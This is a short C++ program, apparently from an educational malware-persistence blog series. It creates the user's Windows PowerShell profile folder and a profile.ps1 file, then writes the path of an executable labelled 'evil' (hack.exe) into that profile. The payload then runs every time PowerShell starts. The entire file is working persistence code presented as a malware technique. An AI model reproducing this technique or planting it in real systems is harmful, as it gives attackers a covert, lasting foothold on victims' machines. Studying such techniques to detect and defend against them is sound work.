/*
pers.cpp
windows persistence via Powershell profile
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
*/
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <iostream>

int main(int argc, char* argv[]) {
  char path[MAX_PATH];
  char *homepath = getenv("USERPROFILE");
  char pspath[] = "\\Documents\\windowspowershell";
  char psprofile[] = "\\profile.ps1";
  char evil[] = "Z:\\2022-09-20-malware-pers-11\\hack.exe";
  DWORD evilLen = (DWORD)strlen(evil);

  StringCchCopy(path, MAX_PATH, homepath);
  StringCchCat(path, MAX_PATH, pspath);
  BOOL wd = CreateDirectoryA(path, NULL);
  if (wd == FALSE) {
    printf("unable to create dir: %s\n", path);
  } else {
    printf("successfully create dir: %s\n", path);
  }

  StringCchCat(path, MAX_PATH, psprofile);
  HANDLE hf = CreateFile(
    path,
    GENERIC_WRITE,
    0,
    NULL,
    CREATE_NEW,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );

  if (hf == INVALID_HANDLE_VALUE) {
    printf("unable to create file: %s\n", path);
  } else {
    printf("successfully create file: %s\n", path);
  }

  BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);
  if (wf == FALSE) {
    printf("unable to write to file %s\n", path);
  } else {
    printf("successfully write to file evil path: %s\n", evil);
  }

  CloseHandle(hf);
  return 0;
}
